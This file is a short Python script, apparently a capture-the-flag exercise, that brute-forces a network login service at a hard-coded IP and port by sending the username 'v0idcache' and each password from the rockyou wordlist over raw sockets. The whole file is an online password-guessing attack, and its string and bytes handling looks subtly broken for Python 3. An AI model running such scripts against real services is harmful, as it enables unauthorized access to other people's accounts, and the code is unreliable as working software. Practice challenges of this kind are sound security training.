import socket

host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    username = "v0idcache\n"   # Hint: use OSINT
    password = ""   # Hint: use wordlist
    with open(wordlist) as f:
        for password in f:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            data = s.recv(1024)
            s.send(username)
            data = s.recv(1024)
            s.send(password)
            data = s.recv(1024)
            if data != 'Fail\n':
                print("The combination username:",username,"with password:",password,"worked!")
                break


if __name__ == '__main__':
    brute_force()
